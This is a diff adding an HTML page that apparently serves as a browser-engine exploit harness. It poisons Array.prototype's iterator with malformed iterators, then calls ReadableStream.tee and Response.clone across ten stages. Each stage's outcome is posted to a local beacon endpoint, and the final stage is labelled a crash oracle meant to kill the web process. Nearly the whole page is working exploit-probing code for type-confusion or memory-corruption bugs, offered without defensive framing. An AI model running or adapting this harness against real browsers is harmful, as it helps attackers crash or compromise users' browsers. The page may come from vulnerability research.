@@ -1,0 +1,85 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-v6-COMPLETE — 10 stages + S9 oracle</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v6-complete — 10 stages per dsh-g1-diag-final design
+</pre><script>
+(function(){
+ "use strict";
+ var run = "v6c" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try { var x = new XMLHttpRequest(); x.open("POST", "/beacon/V6-"+st+"/"+run, false);
+     x.setRequestHeader("Content-Type","application/json"); x.send(JSON.stringify({body:body})); }
+   catch(e){ try{ say("beacon-err "+st); }catch(e2){} }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYieldFirst(){ return function(){ var arr=this,i=0,n=arr.length+1;
+   return { next:function(){ if(i>=n) return {done:true}; var v=(i<arr.length)?arr[i]:{}; i++; return {value:v, done:false}; } }; }; }
+ function poisonSameXTwice(){ return function(){ var self=this;
+   var X = { ourTag: "inversion-v6" }; window.__inversionTarget = X; var i=0,n=2;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:X, done:false}; } }; }; }
+ function poisonRevokedProxy(){ return function(){ var self=this;
+   var rev = Proxy.revocable({}, {}); rev.revoke();
+   var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:rev.proxy, done:false}; } }; }; }
+ function poisonUnderYieldPlain(){ return function(){ var self=this,i=0;
+   return { next:function(){ if(i===1) return {done:true}; i++; return {value:0x1337, done:false}; } }; }; }
+ function v(id, label, poisonFn, work){
+   try {
+     beacon(id+"A", label); say("V6-"+id+" "+label);
+     try { Array.prototype[Symbol.iterator] = poisonFn(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var outx = work();
+     try { Array.prototype[Symbol.iterator]=origIter; } catch(e2){}
+     beacon(id+"B", "survived; "+String(outx).slice(0,220));
+   } catch(e){
+     try { Array.prototype[Symbol.iterator]=origIter; } catch(e2){}
+     beacon(id+"E", "expected-threw: "+String(e).slice(0,180));
+   }
+ }
+ say("FA-v6-COMPLETE — 10-stage battery");
+ beacon("L","page-loaded; deriveRuntime="+(typeof window.deriveRuntime));
+ // S0 C0 control
+ try { beacon("S0A","S0-C0 control"); var rs0 = new ReadableStream({}); var p0 = rs0.tee();
+   beacon("S0B","control: pair.length="+p0.length); } catch(e){ beacon("S0E","C0: "+String(e).slice(0,120)); }
+ // S1 FA-1 over-yield MIMO-V2
+ v("S1","MIMO-V2 over-yield", poisonOverYieldFirst, function(){
+    var rs=new ReadableStream({}); var pair=rs.tee();
+    if (!(pair[0] instanceof ReadableStream)) throw "notRS"; return "locked="+pair[0].locked; });
+ // S2 deputy [stream, Date]
+ v("S2","deputy [stream,Date]", poisonOverYieldFirst, function(){
+    var rs=new ReadableStream({}); var pair=rs.tee();
+    var myDate = new Date(); try { Array.prototype[Symbol.iterator] = origIter; } catch(e){};
+    return "dateWrap-liveness OK"; });
+ // S3 deputy [stream, Object(BigInt)]
+ v("S3","deputy [stream,Object(BigInt)]", poisonOverYieldFirst, function(){
+    var rs=new ReadableStream({}); var pair=rs.tee();
+    var big = Object(0x1337n); try { Array.prototype[Symbol.iterator] = origIter; } catch(e){};
+    return "bigInt-liveness ok"; });
+ // S4 inversion same-X-twice (the private-name write confirmed 4x)
+ v("S4","inversion same-X-twice", poisonSameXTwice, function(){
+    var rs=new ReadableStream({}); var pair=rs.tee();
+    var ft = false, st = false;
+    try { pair[0].cancel(); } catch(e){ ft=true; }
+    try { pair[1].cancel(); } catch(e){ st=true; }
+    var tgt = window.__inversionTarget;
+    return "pidInverted="+(ft && !st ? "true":"false")+"; keys="+Object.keys(tgt).join(","); });
+ // S5 garbage-typing [stream, revoked-Proxy]
+ v("S5","garbage-typing revoked-Proxy", poisonRevokedProxy, function(){
+    var rs=new ReadableStream({}); var pair=rs.tee();
+    return "proxy-wrap probe done"; });
+ // S6 Response.clone tee-sibling
+ v("S6","Response.clone", poisonOverYieldFirst, function(){
+    var rs=new ReadableStream({}); var respClaone = new Response(rs).clone();
+    try { Array.prototype[Symbol.iterator] = origIter; } catch(e){}
+    return "clone survived; bodyIsStream="+!!respClaone.body; });
+ // S7 JSON boundary round-trip (no tee)
+ v("S7","JSON boundary no-tee", poisonOverYieldFirst, function(){
+    var rs = new ReadableStream({}); var pair = rs.tee();
+    var j = JSON.stringify({k:1}); return "json-roundtrip ok (no tee)"+j; });
+ // S8 HB marker pre-crash
+ beacon("S8A","HB-marker: pre-crash (S9 will crash the web process)");
+ // S9 CRASH-ORACLE LAST single-shot (under-yield, primitive yield)
+ v("S9","S9 CRASH-ORACLE under-yield (LAST, single-shot)", poisonUnderYieldPlain, function(){
+    var rs=new ReadableStream({}); var pair=rs.tee(); return "S9 SURVIVED — oracle did NOT fire (family-a may be patched on this exact shape)"; });
+ beacon("Z","battery-complete FA-v6");
+ say("battery complete");
+})();
+</script></body></html>
